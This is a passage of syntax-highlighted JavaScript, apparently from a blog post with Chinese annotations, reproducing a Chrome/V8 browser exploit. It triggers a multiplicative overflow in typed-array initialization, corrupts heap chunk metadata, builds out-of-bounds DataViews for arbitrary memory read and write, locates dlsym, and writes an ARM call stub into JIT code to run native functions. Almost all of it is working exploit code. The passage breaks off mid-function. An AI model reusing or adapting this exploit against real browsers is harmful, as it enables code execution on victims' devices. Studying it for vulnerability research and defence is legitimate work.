class="line"><span class="keyword">var</span> buffersToForce = [];</span><br><span class="line"><span class="keyword">var</span> buffersToForceEarly = [];</span><br><span class="line"><span class="keyword">var</span> viewsToForceEarly = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    buffersToForce.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">4097</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x52</span>);</span><br><span class="line">        force(buf);</span><br><span class="line">        buffersToForceEarly.push(buf);</span><br><span class="line">        <span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf, <span class="number">0</span>, <span class="number">0x51</span>);</span><br><span class="line">        force(view);</span><br><span class="line">        viewsToForceEarly.push(view);</span><br><span class="line">    &#125;</span><br><span class="line">    thingiesToFree.push([]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hexChars = <span class="string">'0123456789abcdef'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asHex</span>(<span class="params">num, len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span>(len === <span class="literal">undefined</span>)</span><br><span class="line">        len = <span class="built_in">Math</span>.ceil(<span class="built_in">Math</span>.log(num)/<span class="built_in">Math</span>.log(<span class="number">16</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        s += hexChars[(num &gt;&gt; (<span class="number">4</span> * i)) &amp; <span class="number">0xf</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexDump</span>(<span class="params">off, len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = off; i &lt; off + len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">0x10</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i != off) s += <span class="string">'\n'</span>;</span><br><span class="line">            s += <span class="string">'+'</span> + asHex(i, <span class="number">8</span>) + <span class="string">':'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s += <span class="string">' '</span> + asHex(read8(i), <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pre</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> el = <span class="built_in">document</span>.createElement(<span class="string">'pre'</span>);</span><br><span class="line">    el.innerHTML = s;</span><br><span class="line">    <span class="built_in">document</span>.documentElement.appendChild(el);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sniffAroundInHeap</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'+1'</span>);</span><br><span class="line">    <span class="keyword">var</span> ary = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer, <span class="number">0</span>, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="comment">//ary[0x7eadbeef];</span></span><br><span class="line">    <span class="keyword">var</span> haveVtable = <span class="literal">false</span>, haveBuffers = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ary.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!haveVtable &amp;&amp; ary[i] == <span class="number">0x51</span>) &#123;</span><br><span class="line">            <span class="comment">// this is DataView+0x20, from which we get the vtable</span></span><br><span class="line">            vtable = ary[i - <span class="number">0x20</span>/<span class="number">4</span>];</span><br><span class="line">            <span class="comment">//alert('vtable = ' + vtable);</span></span><br><span class="line">            haveVtable = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(haveBuffers &lt; <span class="number">2</span> &amp;&amp; ary[i] == <span class="number">0x52</span>) &#123;</span><br><span class="line">            <span class="comment">// this is ArrayBuffer+8, from which we create predictable windows</span></span><br><span class="line">            <span class="comment">// onto memory Why does changing this number affect behavior (v8</span></span><br><span class="line">            <span class="comment">// crashes in ShortCircuitConsString in the garbage collector)?</span></span><br><span class="line">            <span class="keyword">if</span>(haveBuffers == <span class="number">0</span>) &#123;</span><br><span class="line">                callbuf = ary[i<span class="number">-1</span>];</span><br><span class="line">                ary[i<span class="number">-1</span>] = <span class="number">0x100</span>;</span><br><span class="line">                ary[i] = <span class="number">0x7fffffff</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ary[i<span class="number">-1</span>] = <span class="number">0x80000000</span>;</span><br><span class="line">                ary[i] = <span class="number">0x7ffffffe</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            haveBuffers++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(haveVtable &amp;&amp; haveBuffers == <span class="number">2</span>) &#123;</span><br><span class="line">            launderBuffers(buffersToForceEarly, <span class="string">'savedBuffersToForceEarly'</span>, prepareForCalls);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    alert(<span class="string">"didn't find the things"</span>);</span><br><span class="line">    crash();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//hexDump(ary, 0, 0x10000);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//更新wrapper的长度为memory corrupted的长度</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">launderBuffers</span>(<span class="params">origBuffers, prop, callback</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Need to get new V8 wrappers that reflect the native object's new</span></span><br><span class="line">    <span class="comment">// m_sizeInBytes</span></span><br><span class="line">    <span class="comment">// alert('launderBuffers - ' + buffersToForce.length);</span></span><br><span class="line">    <span class="comment">// N.B. this doesn't work with MessageChannels for some reason - the</span></span><br><span class="line">    <span class="comment">// ArrayBuffers become null.  My fault or a bug?</span></span><br><span class="line">    <span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//alert('onmessage');</span></span><br><span class="line">            <span class="keyword">var</span> buffers = e.data;</span><br><span class="line">            <span class="built_in">window</span>[prop] = buffers;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; buffers.length; i++) &#123;</span><br><span class="line">                <span class="keyword">var</span> buffer = buffers[i];</span><br><span class="line">                <span class="keyword">if</span>(buffer.byteLength &gt;= <span class="number">0x7ffffffe</span>) &#123;</span><br><span class="line">                    <span class="comment">//alert('buffer ' + i + '.length = ' + buffer.byteLength);</span></span><br><span class="line">                    <span class="keyword">if</span>(callback(buffer))</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            alert(<span class="string">'no good buffers found - '</span> + prop);</span><br><span class="line">            crash();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            alert(<span class="string">'lB exception: '</span> + e + <span class="string">'\n'</span> + e.stack);</span><br><span class="line">            crash();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">window</span>.postMessage(origBuffers, <span class="string">'*'</span>, origBuffers);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceWithWTFArrayBuffer</span>(<span class="params">arrays, j</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nextOff = <span class="number">0x20</span> - <span class="number">8</span>;</span><br><span class="line">    <span class="comment">// next should have CINUSE and PINUSE set</span></span><br><span class="line">    arrays[j][nextOff + <span class="number">4</span>] = <span class="number">0x3</span>;</span><br><span class="line">    <span class="comment">// now free it</span></span><br><span class="line">    arrays[j] = <span class="literal">null</span>;</span><br><span class="line">    thingiesToFree = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> thingiesToMake = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; buffersToForce.length; i++) &#123;</span><br><span class="line">        force(buffersToForce[i]);</span><br><span class="line">        <span class="comment">// try unnecessarily hard to cause a GC</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; <span class="number">1000</span>; k++) &#123;</span><br><span class="line">            thingiesToMake.push([]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// time to keep overwriting starting at the WTF::ArrayBuffer + 8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initialOverwrite</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arrays = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">300</span>);</span><br><span class="line">    <span class="keyword">var</span> arraysI = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createArray</span>(<span class="params">byteSize, num</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(byteSize);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; byteSize; i++) &#123;</span><br><span class="line">            a[i] = <span class="number">0x42</span>;<span class="comment">//分配给a byteSize字节，并用B填充它。</span></span><br><span class="line">        &#125;</span><br><span class="line">        arrays[arraysI++] = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Here's the actual v8 vulnerability in this complicated thing.</span></span><br><span class="line">    <span class="comment">// Runtime_TypedArrayInitializeFromArrayLike checks for the lack of</span></span><br><span class="line">    <span class="comment">// multiplicative overflow with 'length * element_size &lt; length'.</span></span><br><span class="line">    <span class="comment">// 0x24924925 is 2^32/7 + 1, the smallest number for which this check</span></span><br><span class="line">    <span class="comment">// passes, yet there was in fact overflow.</span></span><br><span class="line">    <span class="keyword">var</span> bad = (<span class="number">0x24925000</span> - <span class="number">8</span>) / <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">var</span> hugetempl = &#123;</span><br><span class="line">      <span class="comment">//length: 0x4924924,</span></span><br><span class="line">      length: <span class="number">0x24924925</span>,</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      i: 76696062,</span></span><br><span class="line"><span class="comment">      get 76696062() &#123;</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      i: <span class="number">0</span>,</span><br><span class="line">      get <span class="number">0</span>() &#123;</span><br><span class="line">        <span class="comment">//alert('creating pages');</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrays.length; i++) &#123;</span><br><span class="line">            createArray(<span class="number">0x20000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert('done');</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> j = <span class="number">0</span>;</span><br><span class="line">    hugetempl.__defineGetter__(bad, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// prev: whatever</span></span><br><span class="line">        <span class="comment">// head: 0x20 | PINUSE_BIT(1) | CINUSE_BIT(2)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">7.611564664e-313</span>;<span class="comment">//deadbeef 00000023,覆盖chunk的meta data，将其size由0x20000改为0x20。</span></span><br><span class="line">        <span class="comment">//在free之后，就会插入0x20 byte free-list的头部</span></span><br><span class="line">    &#125;);<span class="comment">//一页的最后</span></span><br><span class="line">    <span class="keyword">var</span> foundIt = <span class="literal">false</span>;</span><br><span class="line">    hugetempl[bad + <span class="number">1</span>] = <span class="number">2261634.5098039214</span>; <span class="comment">// overwrites </span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在相邻的下一页开始的地方</span></span><br><span class="line"><span class="comment">    u2d</span></span><br><span class="line"><span class="comment">    sakura@sakuradeMacBook-Pro:~$ ./u2d 2261634.5098039214</span></span><br><span class="line"><span class="comment">    ########## mode2 ###########</span></span><br><span class="line"><span class="comment">    表示变换:(ull/ui -&gt; double/float)</span></span><br><span class="line"><span class="comment">    2261634.5098039214(2.261634509803921e+06 ) --d2ull-&gt; 0x4141414141414141</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    the beginning <span class="keyword">of</span> the array</span><br><span class="line">    hugetempl.__defineGetter__(bad + <span class="number">2</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arraysI; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(arrays[j][<span class="number">0</span>] != <span class="number">0x42</span>) &#123;</span><br><span class="line">                <span class="comment">//alert('&lt;- ' + j + ': ' + arrays[j][0]);</span></span><br><span class="line">                replaceWithWTFArrayBuffer(arrays, j);</span><br><span class="line">                foundIt = <span class="literal">true</span>;</span><br><span class="line">                <span class="comment">// m_sizeInBytes=2^31-1 m_deallocationObserver=null</span></span><br><span class="line">                <span class="comment">// can't go higher because it gets treated as signed</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">1.060997895e-314</span>;</span><br><span class="line">                <span class="comment">//0.0000000000(1.060997894988571e-314) --d2ull-&gt; 0x000000007fffffff</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        alert(<span class="string">'No good.  Crashing Chrome for another try...'</span>);</span><br><span class="line">        crash();</span><br><span class="line">    &#125;);</span><br><span class="line">    hugetempl.__defineGetter__(bad + <span class="number">3</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">'ok'</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> huge = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(hugetempl);<span class="comment">//-&gt;触发</span></span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="keyword">if</span>(e == <span class="string">'ok'</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> lowView = <span class="literal">null</span>, highView = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rfunc</span>(<span class="params">prop</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>,</span><br><span class="line">        <span class="string">'if(a &gt;= 0x80000000) '</span> +</span><br><span class="line">            <span class="string">'return highView.'</span> + prop + <span class="string">'(a - 0x80000000, true);'</span> +</span><br><span class="line">        <span class="string">'else '</span> +</span><br><span class="line">            <span class="string">'return lowView.'</span> + prop + <span class="string">'(a - 0x100, true);'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wfunc</span>(<span class="params">prop</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>, <span class="string">'v'</span>,</span><br><span class="line">        <span class="string">'if(a &gt;= 0x80000000) '</span> +</span><br><span class="line">            <span class="string">'highView.'</span> + prop + <span class="string">'(a - 0x80000000, v, true);'</span> +</span><br><span class="line">        <span class="string">'else '</span> +</span><br><span class="line">            <span class="string">'lowView.'</span> + prop + <span class="string">'(a - 0x100, v, true);'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> read32 = rfunc(<span class="string">'getUint32'</span>);</span><br><span class="line"><span class="keyword">var</span> read8 = rfunc(<span class="string">'getUint8'</span>);</span><br><span class="line"><span class="keyword">var</span> write8 = wfunc(<span class="string">'setUint8'</span>);</span><br><span class="line"><span class="keyword">var</span> write32 = wfunc(<span class="string">'setUint32'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params">start, step, words</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> first = words[<span class="number">0</span>], second = words[<span class="number">1</span>];</span><br><span class="line">    outer:</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> a = start; ; a += step) &#123;</span><br><span class="line">        <span class="keyword">if</span>(read32(a) == first &amp;&amp; read32(a+<span class="number">4</span>) == second) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">2</span>; j &lt; words.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(read32(a + j*<span class="number">4</span>) != words[j])</span><br><span class="line">                    <span class="keyword">continue</span> outer;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blxDest</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> val = read32(addr);</span><br><span class="line">    <span class="keyword">var</span> s = (val &amp; <span class="number">0x400</span>) &gt;&gt; <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">var</span> i1 = <span class="number">1</span> - (((val &amp; <span class="number">0x20000000</span>) &gt;&gt; <span class="number">29</span>) ^ s);</span><br><span class="line">    <span class="keyword">var</span> i2 = <span class="number">1</span> - (((val &amp; <span class="number">0x8000000</span>) &gt;&gt; <span class="number">27</span>) ^ s);</span><br><span class="line">    <span class="keyword">var</span> i10h = val &amp; <span class="number">0x3ff</span>;</span><br><span class="line">    <span class="keyword">var</span> i10l = (val &amp; <span class="number">0x7fe0000</span>) &gt;&gt; <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">var</span> off = ((s * <span class="number">0xff</span>) &lt;&lt; <span class="number">24</span>) | (i1 &lt;&lt; <span class="number">23</span>) | (i2 &lt;&lt; <span class="number">22</span>) | (i10h &lt;&lt; <span class="number">12</span>) | (i10l &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> ((addr + <span class="number">4</span>) &amp; ~<span class="number">3</span>) + off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ldrDest</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((addr + <span class="number">4</span>) &amp; ~<span class="number">3</span>) + <span class="number">4</span> * read8(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ldrAddPCDest</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr + <span class="number">2</span> + <span class="number">4</span> + read32(ldrDest(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copystr</span>(<span class="params">p, s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++)</span><br><span class="line">        write8(p + i, s.charCodeAt(i));</span><br><span class="line">    write8(p + i, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NEGONE = <span class="number">0xffffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params">func, a1, a2, a3, a4, a5, a6, a7, a8</span>) </span>&#123;</span><br><span class="line">    assert(func);</span><br><span class="line">    write32(callbuf + <span class="number">0x00</span>, a5);</span><br><span class="line">    write32(callbuf + <span class="number">0x04</span>, a6);</span><br><span class="line">    write32(callbuf + <span class="number">0x08</span>, a7);</span><br><span class="line">    write32(callbuf + <span class="number">0x0c</span>, a8);</span><br><span class="line">    write32(callbuf + <span class="number">0x10</span>, a1);</span><br><span class="line">    write32(callbuf + <span class="number">0x14</span>, a2);</span><br><span class="line">    write32(callbuf + <span class="number">0x18</span>, a3);</span><br><span class="line">    write32(callbuf + <span class="number">0x1c</span>, a4);</span><br><span class="line">    write32(callbuf + <span class="number">0x20</span>, func);</span><br><span class="line">    deadfunc(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span> read32(callbuf + <span class="number">0x24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prepareForCalls</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer, <span class="number">0</span>, buffer.byteLength);</span><br><span class="line">    <span class="keyword">if</span>(buffer.byteLength == <span class="number">0x7fffffff</span>) &#123;</span><br><span class="line">        lowView = dv;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highView = dv;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(lowView &amp;&amp; highView)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    alert(<span class="string">'+2'</span>);</span><br><span class="line">    <span class="keyword">var</span> text = read32(vtable + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">var</span> dlsymmer = find((text &amp; ~<span class="number">1</span>) + <span class="number">0x900000</span>, <span class="number">2</span>,</span><br><span class="line">        [<span class="number">0x46204798</span>, <span class="number">0xc0d6f59c</span>, <span class="number">0x4038e8bd</span>, <span class="number">0xb9ddf000</span>, <span class="number">0x0422bf00</span>]);</span><br><span class="line">    dlsym_addr = blxDest(dlsymmer - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This thing is probably the easiest way to be able to call functions with</span></span><br><span class="line">    <span class="comment">// arbitrarily many arguments.  It may turn out to be unnecessary if none</span></span><br><span class="line">    <span class="comment">// of the functions use that many arguments, but whatever...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> tdter = find(dlsymmer, <span class="number">2</span>, [<span class="number">0x0058f645</span>, <span class="number">0x601a6016</span>]);</span><br><span class="line">    <span class="keyword">var</span> thread_data_table_ptr = ldrAddPCDest(tdter - <span class="number">6</span>);</span><br><span class="line">    <span class="comment">//alert('tdter:' + asHex(tdter) + ' tdt:' + asHex(thread_data_table_));</span></span><br><span class="line">    <span class="keyword">var</span> thread_data_table_ = read32(thread_data_table_ptr);</span><br><span class="line">    <span class="keyword">var</span> list_ = read32(thread_data_table_);</span><br><span class="line">    <span class="keyword">var</span> isolate_ = read32(list_);</span><br><span class="line">    <span class="keyword">var</span> heap_ = isolate_ + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">var</span> lo_space_ = read32(heap_ + <span class="number">0x598</span>); <span class="comment">/* ! */</span></span><br><span class="line">    <span class="keyword">var</span> a = <span class="string">'eval("");'</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">40000</span>; i++) a += <span class="string">'a.a;'</span></span><br><span class="line">    a += <span class="string">'return 42;'</span>;</span><br><span class="line">    deadfunc = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>, a);</span><br><span class="line">    deadfunc(&#123;&#125;);</span><br><span class="line">    <span class="keyword">var</span> first_page_ = read32(lo_space_ + <span class="number">0x14</span>);</span><br><span class="line">    <span class="keyword">var</span> area_start_ = read32(first_page_ + <span class="number">0x10</span>), area_end_ = read32(first_page_ + <span class="number">0x14</span>);</span><br><span class="line">    <span class="comment">//alert('los=' + asHex(lo_space_) + ' code=' + asHex(code));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    00000000    e92d4030        push    &#123;r4, r5, lr&#125;</span></span><br><span class="line"><span class="comment">    00000004    e59f5020        ldr     r5, [pc, #32]   ; 0x2c</span></span><br><span class="line"><span class="comment">    00000008    e8b5000f        ldm     r5!, &#123;r0, r1, r2, r3&#125;</span></span><br><span class="line"><span class="comment">    0000000c    e92d000f        push    &#123;r0, r1, r2, r3&#125;</span></span><br><span class="line"><span class="comment">    00000010    e8b5001f        ldm     r5!, &#123;r0, r1, r2, r3, r4&#125;</span></span><br><span class="line"><span class="comment">    00000014    e12fff34        blx     r4</span></span><br><span class="line"><span class="comment">    00000018    e5850000        str     r0, [r5]</span></span><br><span class="line"><span class="comment">    0000001c    e8bd403f        pop     &#123;r0, r1, r2, r3, r4, r5, lr&#125;</span></span><br><span class="line"><span class="comment">    00000020    e3a00000        mov     r0, #0  ; 0x0</span></span><br><span class="line"><span class="comment">    00000024    e3a01000        mov     r1, #0  ; 0x0</span></span><br><span class="line"><span class="comment">    00000028    e12fff1e        bx      lr</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">var</span> insts = [<span class="number">0xe92d4030</span>,<span class="number">0xe59f5020</span>,<span class="number">0xe8b5000f</span>,<span class="number">0xe92d000f</span>,<span class="number">0xe8b5001f</span>,<span class="number">0xe12fff34</span>,<span class="number">0xe5850000</span>,<span class="number">0xe8bd403f</span>,<span class="number">0xe3a00000</span>,<span class="number">0xe3a01000</span>,<span class="number">0xe12fff1e</span>, callbuf];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> a = area_start_; a &lt; area_end_; a += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>((read32(a) &amp; <span class="number">0xffff0000</span>) == (<span class="number">0xe92d0000</span> | <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; insts.length; i++)</span><br><span class="line">                write32(a + i * <span class="number">4</span>, insts[i]);</span><br><span class="line">            <span class="keyword">var</span> end = a + insts.length * <span class="number">4</span>;</span><br><span class="line">            insts[insts.length - <span class="number">1</span>] = callbuf + <span class="number">0x28</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; insts.length; i++)</span><br><span class="line">                write32(end + i * <span class="number">4</span>, insts[i]);</span><br><span class="line">            bxlr = end - <span class="number">8</span>;</span><br><span class="line">            stub2 = end;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a == area_end_) &#123;</span><br><span class="line">        alert(<span class="string">"didn't find push area="</span> + first_page_);</span><br><span class="line">        crash();</span><br><span class="line">    &#125;</span><br><span class="line">    write32(callbuf + <span class="number">0x20</span>, bxlr);</span><br><span class="line">    <span class="keyword">while</span>(deadfunc(&#123;&#125;) == <span class="number">42</span>);</span><br><span class="line">    <span class="comment">//alert('OK');</span></span><br><span class="line">    theFunPart();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assert</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!x) &#123;</span><br><span class="line">        <span class="keyword">var</span> errno = read32(call(funcs.__errno));</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Assertion failed; errno = '</span> + errno);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xerr = <span class="literal">null</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xassert</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!x &amp;&amp; !xerr) &#123;</span><br><span class="line">        xerr = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Assertion failed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MInt</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        w: <span class="function"><span class="keyword">function</span>(<span class="params">buf</span>) </span>&#123;</span><br><span class="line">            write32(buf.addr, 